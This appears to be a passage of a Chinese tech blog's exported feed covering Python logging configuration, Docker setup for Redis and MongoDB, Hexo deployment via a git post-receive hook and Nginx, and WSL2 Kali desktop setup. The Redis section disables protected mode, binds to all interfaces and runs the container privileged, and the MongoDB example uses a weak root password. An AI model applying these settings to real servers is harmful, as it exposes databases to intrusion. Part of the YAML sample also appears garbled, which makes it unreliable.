添加处理器到记录器中</span></span><br><span class="line">logger.addHandler(console_handler)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭IO流, 非常重要 </span></span><br><span class="line">console_handler.close()</span><br><span class="line">file_handler.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出日志</span></span><br><span class="line">logger.info(<span class="string">&#x27;一切正常~&#x27;</span>)</span><br><span class="line">logger.error(<span class="string">&#x27;报错啦!!&#x27;</span>)</span><br><span class="line">logger.debug(<span class="string">&#x27;找bug中...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前处理器</span></span><br><span class="line"><span class="built_in">print</span>(logger.handlers)</span><br></pre></td></tr></table></figure>



<h2 id="✨使用YAML配置日志"><a href="#✨使用YAML配置日志" class="headerlink" title="✨使用YAML配置日志"></a>✨使用YAML配置日志</h2><blockquote>
<p>接触YAML是在搭建博客时, 发现了如此简洁优雅的文件格式, 搭项目时考虑到配置的易用性和易读性, 随即便折腾起来了φ(*￣0￣)</p>
<p>pyyaml官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9weXlhbWwub3JnL3dpa2kvUHlZQU1MRG9jdW1lbnRhdGlvbg==">🚪</span></p>
</blockquote>
<p>在<code>conf</code>目录下创建<code>log_conf.yml</code>, 存放配置, 配置最后将转为dist传入到<code>dictConfig()</code>里, 这也是进一步了解logging的过程.</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">1</span></span><br><span class="line"><span class="comment"># 将信息传播到配置文件的跟日志记录器中</span></span><br><span class="line"><span class="attr">disable_existing_loggers:</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化器</span></span><br><span class="line"><span class="attr">formatters:</span></span><br><span class="line">  <span class="attr">file:</span> <span class="comment"># 格式化器id, 自定义</span></span><br><span class="line">    <span class="attr">datefmt:</span> <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">&#x27;%(asctime)s.%(msecs)03d|%(levelname)s|[%(process)d,%(thread)d]|[%(filename)s,%(lineno)d,%(funcName)s]|%(message)s&#x27;</span></span><br><span class="line">  <span class="attr">color:</span></span><br><span class="line">    <span class="comment"># 使用特殊键&#x27;()&#x27;传入格式化器, 下面的配置会作为参数传入, 同理, 处理器、过滤器也支持自定义对象</span></span><br><span class="line">    <span class="string">():</span> <span class="string">&#x27;colorlog.ColoredFormatter&#x27;</span> <span class="comment"># =&gt; colorlog.ColoredFormatter(**kwargs)</span></span><br><span class="line">    <span class="attr">datefmt:</span> <span class="string">&#x27;%m-%d %H:%M:%S&#x27;</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">&#x27;%(white)s%(asctime)s %(reset)s%(log_color)s[%(levelname)s %(process)d]%(reset)s %(cyan)s%(reset)s%(message)s&#x27;</span></span><br><span class="line">    <span class="attr">log_colors:</span></span><br><span class="line">      <span class="attr">DEBUG:</span> <span class="string">cyan</span></span><br><span class="line">      <span class="attr">INFO:</span> <span class="string">green</span></span><br><span class="line">      <span class="attr">WARNING:</span> <span class="string">yellow</span></span><br><span class="line">      <span class="attr">ERROR:</span> <span class="string">red</span></span><br><span class="line">      <span class="attr">CRITICAL:</span> <span class="string">bold_red</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理程序</span></span><br><span class="line"><span class="attr">handlers:</span></span><br><span class="line">  <span class="attr">console:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">logging.StreamHandler</span> <span class="comment"># 这是处理程序类的完整名称</span></span><br><span class="line">    <span class="attr">formatter:</span> <span class="string">color</span>  <span class="comment"># 处理程序所对应格式化器的ID</span></span><br><span class="line">    <span class="attr">level:</span> <span class="string">DEBUG</span>  <span class="comment"># 处理程序的级别</span></span><br><span class="line">    <span class="comment"># filters: [allow_foo]  # 由处理程序所对应过滤器的ID 组成的列表</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">logging.handlers.RotatingFileHandler</span></span><br><span class="line">    <span class="attr">formatter:</span> <span class="string">file</span></span><br><span class="line">    <span class="attr">level:</span> <span class="string">INFO</span></span><br><span class="line">    <span class="attr">filename:</span> <span class="string">logconfig.log</span></span><br><span class="line">    <span class="attr">maxBytes:</span> <span class="number">52428800</span> <span class="comment"># 1024*1024*50</span></span><br><span class="line">    <span class="attr">backupCount:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志记录器</span></span><br><span class="line"><span class="attr">loggers:</span></span><br><span class="line">  <span class="attr">my_logger:</span></span><br><span class="line">    <span class="comment"># level: ERROR # 这里的优先级高</span></span><br><span class="line">    <span class="attr">handlers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">console</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">file</span></span><br><span class="line">    <span class="comment"># 打开日志记录器</span></span><br><span class="line">    <span class="attr">propagate:</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根记录器配置</span></span><br><span class="line"><span class="attr">root:</span></span><br><span class="line">  <span class="attr">level:</span> <span class="string">DEBUG</span></span><br><span class="line">  <span class="attr">handlers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">consoleversion:</span> <span class="number">1</span></span><br><span class="line"><span class="comment"># 将信息传播到配置文件的跟日志记录器中</span></span><br><span class="line"><span class="attr">disable_existing_loggers:</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>代码部分</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line"></span><br><span class="line">LOG_CONF_DIR = <span class="string">r&#x27;config/log_conf.yml&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=LOG_CONF_DIR, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    log_conf = yaml.load(stream=f, Loader=yaml.FullLoader)</span><br><span class="line"></span><br><span class="line">logging.config.dictConfig(config=log_conf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取日志记录器</span></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;my_logger&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">&#x27;找bug中...&#x27;</span>)</span><br><span class="line">logger.info(<span class="string">&#x27;一切正常~&#x27;</span>)</span><br><span class="line">logger.error(<span class="string">&#x27;报错啦!!&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="记录流程图"><a href="#记录流程图" class="headerlink" title="记录流程图"></a>记录流程图</h2><blockquote>
<p>有个印象(～￣▽￣)～</p>
</blockquote>
<img data-src="http://img.owq.world/2021/11/2123-044c15.png" style="border-radius: 0px;" />



<hr>
<blockquote>
<p>日志懒人库: <strong>loguru</strong> 更加强大更为易用 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RlbGdhbi9sb2d1cnU=">🚪</span></p>
</blockquote>
]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>YAML</tag>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker+Redis 安装配置</title>
    <url>/8be682ad/</url>
    <content><![CDATA[<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker pull redis</span></span><br></pre></td></tr></table></figure>

<h2 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/data/</span>redis</span><br></pre></td></tr></table></figure>

<h2 id="下载配置文件"><a href="#下载配置文件" class="headerlink" title="下载配置文件"></a>下载配置文件</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>download.redis.io<span class="regexp">/redis-stable/</span>redis.conf &gt;&gt; <span class="regexp">/etc/</span>redis/redis.conf</span><br></pre></td></tr></table></figure>

<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>redis/redis.conf</span><br></pre></td></tr></table></figure>

<p>根据需求修改配置文件</p>
<blockquote>
<p>参考资料 &gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80MWYzOTNmNTk0ZTg=">🚪</span></p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line"><span class="attribute">bind</span> <span class="number">0.0.0.0</span></span><br><span class="line"></span><br><span class="line">port <span class="number">6379</span></span><br><span class="line">requirepass ****</span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否开启保护模式，默认开启，如果没有设置bind项和redis密码的话，服务将只允许本地访问。</span></span><br><span class="line">protected-mode <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库个数</span></span><br><span class="line">databases <span class="number">16</span></span><br><span class="line"></span><br><span class="line">dir ./	<span class="comment"># 输入本地redis数据库存放文件夹</span></span><br><span class="line"></span><br><span class="line">appendonly <span class="literal">yes</span> <span class="comment"># redis持久化</span></span><br><span class="line"></span><br><span class="line">logfile <span class="string">&quot;redis.log&quot;</span> <span class="comment"># 日志文件存放</span></span><br></pre></td></tr></table></figure>

<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">-p 6379:6379 --name redis \</span><br><span class="line">-v /etc/redis/redis.conf:/etc/redis/redis.conf \	<span class="comment"># 挂载配置文件</span></span><br><span class="line">-v /data/redis:/data:rw \	<span class="comment"># 挂载数据目录 rw 为读写</span></span><br><span class="line">--privileged=<span class="literal">true</span> \	<span class="comment"># 提升容器权限（拥有真正的root权限）</span></span><br><span class="line">-d redis redis-server /etc/redis/redis.conf	<span class="comment"># 配置文件启动服务</span></span><br></pre></td></tr></table></figure>

<h2 id="验证启动"><a href="#验证启动" class="headerlink" title="验证启动"></a>验证启动</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure>

<h2 id="失败处理"><a href="#失败处理" class="headerlink" title="失败处理"></a>失败处理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看错误日志</span></span><br><span class="line">docker logs redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 redis 挂载端口映射等信息</span></span><br><span class="line">docker inspect redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 redis 端口映射</span></span><br><span class="line">docker port redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除重试</span></span><br><span class="line">docker <span class="built_in">rm</span> redis</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>配置记录</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker+MongoDB 安装配置</title>
    <url>/d2633d2c/</url>
    <content><![CDATA[<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mongo</span><br></pre></td></tr></table></figure>

<h2 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /data/mongo</span><br></pre></td></tr></table></figure>

<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 27017:27017 -v /data/mongo:/data/db --name mongo -d mongo --auth</span><br></pre></td></tr></table></figure>

<h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it mongo mongo admin</span><br></pre></td></tr></table></figure>

<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">db.createUser(</span><br><span class="line">  &#123;</span><br><span class="line">    user: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="built_in">pwd</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">    roles: [ &#123; role: <span class="string">&#x27;root&#x27;</span>, db: <span class="string">&#x27;admin&#x27;</span> &#125; ]	<span class="comment"># 指定权限和数据库</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">mongodb:</span>//admin:password<span class="subst">@127</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span></span><br></pre></td></tr></table></figure>

<h2 id="正常安装"><a href="#正常安装" class="headerlink" title="正常安装"></a>正常安装</h2><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubW9uZ29kYi5jb20vZG9jcy9tYW51YWwvaW5zdGFsbGF0aW9uLw==">Install MongoDB — MongoDB Manual</span></p>
</blockquote>
]]></content>
      <categories>
        <category>配置记录</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Mongo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo + Nginx 服务器部署踩坑记录</title>
    <url>/e823826f/</url>
    <content><![CDATA[<blockquote>
<p>Hexo 部署方式有很多, 这里选择是默认的 Git 一键部署方式.<br>前提条件: 搭建好的 Hexo 本地环境, 具有公网IP的服务器, 具备ssh知识.</p>
</blockquote>
<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL3poLWNuL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudA==">官方文档</span> （用处较小）</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvLWRlcGxveWVyLWdpdA==">部署插件</span> （自定义配置会用到）</li>
</ul>
<h2 id="服务器环境准备"><a href="#服务器环境准备" class="headerlink" title="服务器环境准备"></a>服务器环境准备</h2><h3 id="安装-git-和-Nginx"><a href="#安装-git-和-Nginx" class="headerlink" title="安装 git 和 Nginx"></a>安装 git 和 Nginx</h3><ul>
<li><p>git<br>用来接收你的网站文件推送的，是实现一键部署的关键。</p>
</li>
<li><p>Nginx<br>一款反向代理网页服务器，让你的网站得以被外部访问的关键。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">apt install git nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line">yum install -y git nginx</span><br></pre></td></tr></table></figure>



<h3 id="创建一个-git-用户-可选"><a href="#创建一个-git-用户-可选" class="headerlink" title="创建一个 git 用户(可选)"></a>创建一个 git 用户(可选)</h3><p>创建专门用来管理Git仓库的用户，主要是为了权限管理，可参考<span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL2VuL3YyL0dpdC1vbi10aGUtU2VydmVyLVNldHRpbmctVXAtdGhlLVNlcnZlcg==">官方文档</span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>

<h3 id="启用git-shell-可选"><a href="#启用git-shell-可选" class="headerlink" title="启用git shell(可选)"></a>启用<code>git shell</code>(可选)</h3><p>查看git-shell是否存在</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shells</span><br></pre></td></tr></table></figure>

<p>不存在则添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看git-shell路径 默认：/usr/bin/git-shell</span></span><br><span class="line"><span class="built_in">which</span> git-shell</span><br><span class="line"><span class="comment"># 把路径添加到shells文件里</span></span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>

<p>修改git用户默认shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chsh git -s $(<span class="built_in">which</span> git-shell)</span><br></pre></td></tr></table></figure>

<p>测试ssh连接，登录不成功即配置ok</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">git@<span class="keyword">&lt;IP地址&gt;</span></span></span><br></pre></td></tr></table></figure>



<h3 id="配置ssh公钥"><a href="#配置ssh公钥" class="headerlink" title="配置ssh公钥"></a>配置ssh公钥</h3><p>用户目录下创建 <code>.ssh</code> 文件夹并设置权限为 700</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用git用户需要进行切换</span></span><br><span class="line">su git</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> ~/.ssh &amp;&amp; <span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>

<p>创建 <code>authorized_keys </code> 文件, 将本机公钥复制到里面.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>修改权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>



<h3 id="创建相关目录"><a href="#创建相关目录" class="headerlink" title="创建相关目录"></a>创建相关目录</h3><p>创建存放Blog的git仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/repo &amp;&amp; <span class="built_in">cd</span> /var/repo</span><br><span class="line">git init --bare blog.git</span><br></pre></td></tr></table></figure>

<p>创建存放网站静态文件的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/www/hexo</span><br></pre></td></tr></table></figure>

<p>设置目录权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R git:git /var/www/hexo</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /var/www/hexo</span><br></pre></td></tr></table></figure>

<p><em>PS:仓库名<code>blog.git</code>、静态文件目录<code>hoxo</code>可自定义</em></p>
<h3 id="添加post-receive钩子"><a href="#添加post-receive钩子" class="headerlink" title="添加post-receive钩子"></a>添加<code>post-receive</code>钩子</h3><blockquote>
<p>官方参考文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyLyVFOCU4NyVBQSVFNSVBRSU5QSVFNCVCOSU4OS1HaXQtR2l0LSVFOSU5MiVBOSVFNSVBRCU5MA==">🚪</span></p>
</blockquote>
<p>在仓库下的 <code>hooks</code> 目录创建 <code>post-receive</code> 文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/var/</span>repo<span class="regexp">/blog.git/</span>hooks/post-receive</span><br></pre></td></tr></table></figure>

<p>添加以下内容, 这个钩子会在你本地更新推送到服务器完成后执行, 更新你的网站内容。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">git --work-tree=/var/www/hexo --git-dir=/var/repo/blog.git checkout -f</span><br></pre></td></tr></table></figure>

<p>配置权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/repo/blog.git/hooks/</span><br><span class="line"><span class="built_in">chown</span> -R git:git /var/repo/</span><br><span class="line"><span class="built_in">chown</span> -R git:git /var/www/hexo</span><br><span class="line"><span class="built_in">chmod</span> +x post-receive</span><br></pre></td></tr></table></figure>



<h3 id="检测仓库是否配置成功"><a href="#检测仓库是否配置成功" class="headerlink" title="检测仓库是否配置成功"></a>检测仓库是否配置成功</h3><p>能成功克隆则代表配置正确</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;使用的用户名&gt;@&lt;你的服务器IP&gt;:/var/repo/blog.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子</span></span><br><span class="line">git <span class="built_in">clone</span> git@8.8.8.8:/var/repo/blog.git</span><br></pre></td></tr></table></figure>



<h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>这里修改下Nginx的默认站点配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/</span><br><span class="line">vim sites-enabled/default</span><br></pre></td></tr></table></figure>

<p>里面长这样 ↓<br><img data-src="http://img.owq.world/2021/11/2122-11343b.png"  /></p>
<p>这里修改root网站根目录就行了，其它可以保持不动</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">root /var/www/hexo;</span><br></pre></td></tr></table></figure>

<h3 id="可选配置"><a href="#可选配置" class="headerlink" title="可选配置"></a>可选配置</h3><p><code>server_name _;</code> 一行表示全匹配，只要访问服务器，都会直接转发到当前<code>server</code>下，有域名后可以设置为域名，然后配置<code>不允许ip访问</code>，这样可以避免其他人把未备案的域名解析到自己的服务器 IP，而导致服务器被断网。(如果你没备案就解析域名了，那现在就该知道服务器登不了的原因了🤣)</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意：以下内容可以在default文件中修改，不过推荐先了解Nginx然后再配置为妙。</span></span><br><span class="line"></span><br><span class="line">http <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 新增server，设置不允许Ip访问web(default_server)</span></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">        listen <span class="number">80</span> default_server;</span><br><span class="line">        server_name _;</span><br><span class="line">        return <span class="number">403</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原有default，设置www.you.com域名访问web</span></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">        listen <span class="number">80</span>;</span><br><span class="line">        server_name www.you.com;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新增server，设置顶级域名you.com重定向</span></span><br><span class="line">    server <span class="punctuation">&#123;</span></span><br><span class="line">       listen <span class="number">80</span>;</span><br><span class="line">       server_name you.com;</span><br><span class="line">       return <span class="number">301</span> http<span class="punctuation">:</span><span class="comment">//www.you.com$request_uri;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>检查配置然后重载<code>Nginx</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t	<span class="comment"># 检查配置</span></span><br><span class="line">nginx -s reload	<span class="comment"># 重载配置</span></span><br></pre></td></tr></table></figure>



<h2 id="本地部署配置"><a href="#本地部署配置" class="headerlink" title="本地部署配置"></a>本地部署配置</h2><blockquote>
<p>部署插件项目 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvLWRlcGxveWVyLWdpdA==">🚪</span></p>
</blockquote>
<p><strong>修改站点目录下<code>_config.yml</code>文件</strong></p>
<h3 id="单个存储部署配置"><a href="#单个存储部署配置" class="headerlink" title="单个存储部署配置"></a>单个存储部署配置</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span> git@x.x.x.x:<span class="keyword">/var/</span>repo/blog.git</span><br></pre></td></tr></table></figure>

<h3 id="多个存储库部署配置（可选）"><a href="#多个存储库部署配置（可选）" class="headerlink" title="多个存储库部署配置（可选）"></a>多个存储库部署配置（可选）</h3><p>这里同时对github和服务器进行同步，可以用来应付一些特殊情况，比如：服务器挂了、封了什么的。</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span></span><br><span class="line"><span class="symbol">    server:</span> <span class="meta"># 名称可自定义</span></span><br><span class="line"><span class="symbol">      url:</span> git@x.x.x.x:<span class="keyword">/var/</span>repo/blog.git</span><br><span class="line"><span class="symbol">      branch:</span> master</span><br><span class="line"><span class="symbol">    git:</span></span><br><span class="line"><span class="symbol">      url:</span> git@github.com:owq/owq.github.io.git</span><br><span class="line"><span class="symbol">      branch:</span> main</span><br></pre></td></tr></table></figure>



<h2 id="部署到服务器"><a href="#部署到服务器" class="headerlink" title="部署到服务器"></a>部署到服务器</h2><p>本地操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清除缓存</span></span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署</span></span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

<blockquote>
<p>浏览器输入服务器IP,能正常访问就成功了</p>
</blockquote>
]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Nginx</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>优雅的使用WSL2-Kali桌面环境</title>
    <url>/202281bd/</url>
    <content><![CDATA[<blockquote>
<p>Win-KeX官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy93c2wvd2luLWtleC8=">🚪</span></p>
</blockquote>
<h2 id="安装win-kex"><a href="#安装win-kex" class="headerlink" title="安装win-kex"></a>安装win-kex</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install kali-win-kex</span><br></pre></td></tr></table></figure>

<h2 id="启动Win-Kex"><a href="#启动Win-Kex" class="headerlink" title="启动Win-Kex"></a>启动Win-Kex</h2><blockquote>
<p>Win-KeX 有三种启动模式</p>
</blockquote>
<ul>
<li><p>窗口模式<br>在专用窗口中启动 Kali Linux 桌面.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kex --win -s	</span><br></pre></td></tr></table></figure>
</li>
<li><p>远程连接（推荐）<br>微软自带的远程桌面工具，用过的都说好~</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kex --esm --ip -s</span><br></pre></td></tr></table></figure>
</li>
<li><p>无缝模式<br>在 Windows 和 Kali 应用程序和菜单之间共享 Windows 桌面.</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">kex <span class="comment">--sl -s</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><em>注: 后面参数<code>-s</code>是启动声音支持.</em></p>
<h2 id="高分屏下的使用"><a href="#高分屏下的使用" class="headerlink" title="高分屏下的使用"></a>高分屏下的使用</h2><blockquote>
<p>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy9nZW5lcmFsLXVzZS9oaWRwaS8=">🚪</span></p>
</blockquote>
<p>菜单搜索<code>hidpi</code>, 打开它</p>
<p><img data-src="http://img.owq.world/2021/11/2110-eb457c.png"></p>
<p>默认缩放2X, 点击<code>是</code>确认, 然后开始愉快的Linux之旅吧~</p>
<p><img data-src="http://img.owq.world/2021/11/2110-542567.png"></p>
<p><em>注:如果要自定义缩放因子请参考官方文档</em></p>
<h2 id="快捷启动"><a href="#快捷启动" class="headerlink" title="快捷启动"></a>快捷启动</h2><ul>
<li>添加到<code>Windows Termial</code>启动</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;guid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;576cd4fd-d6e2-4b99-9305-2e03a898af04&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hidden&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win-KeX&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;commandline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wsl -d kali-linux kex --esm --wtstart -s&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span>，</span><br></pre></td></tr></table></figure>

<ul>
<li>设置命令别名</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> winkex=<span class="string">&#x27;kex --esm --ip -s&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>配置记录</category>
      </categories>
      <tags>
        <tag>WSL2</tag>
        <tag>Kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2 安装配置</title>
    <url>/1fe3c459/</url>
    <content><![CDATA[<blockquote>
<p>官方文档: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93c2wvaW5zdGFsbA==">https://docs.microsoft.com/en-us/windows/wsl/install</span></p>
</blockquote>
